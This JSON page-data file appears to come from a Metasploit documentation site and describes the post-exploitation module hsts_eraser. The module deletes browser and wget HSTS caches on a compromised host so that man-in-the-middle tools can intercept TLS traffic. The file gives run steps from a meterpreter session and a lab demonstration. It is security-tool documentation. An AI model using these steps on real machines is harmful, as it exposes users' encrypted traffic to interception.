{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/manage/hsts_eraser","result":{"data":{"moduleMetadataJson":{"id":"abd8d9ec-26cb-547a-9a57-d35111e97e7c","name":"Web browsers HSTS entries eraser","fullname":"post/multi/manage/hsts_eraser","description":"This module removes the HSTS database of the following tools and web browsers: Mozilla Firefox,\n        Google Chrome, Opera, Safari and wget.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/manage/hsts_eraser","documentationSlug":"/modules/documentation/post/multi/manage/hsts_eraser"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module allows you to erase the <a href=\"https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security\">HTTP Strict-Transport-Security</a> cache of a target machine.\nWhen combined with a sniffer or a man-in-the-middle tool, this module will assist with the capture/modification of TLS-encrypted traffic.</p>\n<p><strong>WARNING:</strong> This module <em>erases</em> the HSTS cache, leaving the target in a vulnerable state.  All browser traffic from all users on the target will be subject\nto man-in-the-middle attacks.  There is no undo built-into this module.  If you intend to revert, you must first backup the HSTS file before running the module.</p>\n<p>Note: This module searches for all non-root users on the system.  It will not erase HSTS data for the root user.</p>\n<p>The following platforms are supported:</p>\n<ul>\n<li>Windows</li>\n<li>Linux</li>\n<li>OS X</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Obtain and background a session from the target machine.</li>\n<li>From the <code class=\"language-text\">msf&gt;</code> prompt, do <code class=\"language-text\">use post/multi/manage/hsts_eraser</code></li>\n<li>Set the <code class=\"language-text\">DISCLAIMER</code> option to <code class=\"language-text\">True</code> (after reading the above <strong>WARNING</strong>)</li>\n<li>Set the <code class=\"language-text\">SESSION</code> option</li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Alternatively:</p>\n<ol>\n<li>Obtain a session from the target machine.</li>\n<li>From the <code class=\"language-text\">meterpreter&gt;</code> prompt, do <code class=\"language-text\">run post/multi/manage/hsts_eraser DISCLAIMER=True</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Set up a Kali VM with some HSTS data:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">root@kali-2017:~<span class=\"token comment\"># adduser bob</span>\nroot@kali-2017:~<span class=\"token comment\"># su bob</span>\nbob@kali-2017:/root$ <span class=\"token builtin class-name\">cd</span>\n\nbob@kali-2017:~$ <span class=\"token function\">wget</span> -S https://outlook.live.com/owa/ <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> -i strict\n  Strict-Transport-Security: max-age<span class=\"token operator\">=</span><span class=\"token number\">31536000</span><span class=\"token punctuation\">;</span> includeSubDomains\n  Strict-Transport-Security: max-age<span class=\"token operator\">=</span><span class=\"token number\">31536000</span><span class=\"token punctuation\">;</span> includeSubDomains\nbob@kali-2017:~$ <span class=\"token function\">cat</span> .wget-hsts \n<span class=\"token comment\"># HSTS 1.0 Known Hosts database for GNU Wget.</span>\n<span class=\"token comment\"># Edit at your own risk.</span>\n<span class=\"token comment\"># &lt;hostname>\t&lt;port>\t&lt;incl. subdomains>\t&lt;created>\t&lt;max-age></span>\noutlook.live.com\t<span class=\"token number\">0</span>\t<span class=\"token number\">1</span>\t<span class=\"token number\">1519176414</span>\t<span class=\"token number\">31536000</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Create an <code class=\"language-text\">msfvenom</code> payload, execute it, and then connect to it with <code class=\"language-text\">multi/exploit/handler</code>.  From the Meterpreter session on the victim:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Meterpreter session 1 opened (127.0.0.1:38089 -&gt; 127.0.0.1:44444) at 2018-02-20 19:19:02 -0600\n\nmeterpreter &gt; run post/multi/manage/hsts_eraser DISCLAIMER=True\n\n[*] Removing wget HSTS database for bob... \n[*] HSTS databases removed! Now enjoy your favorite sniffer! ;-)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Confirm that the file was deleted:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">bob@kali-2017:~$ <span class=\"token function\">cat</span> .wget-hsts \ncat: .wget-hsts: No such <span class=\"token function\">file</span> or directory</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"abd8d9ec-26cb-547a-9a57-d35111e97e7c"}}}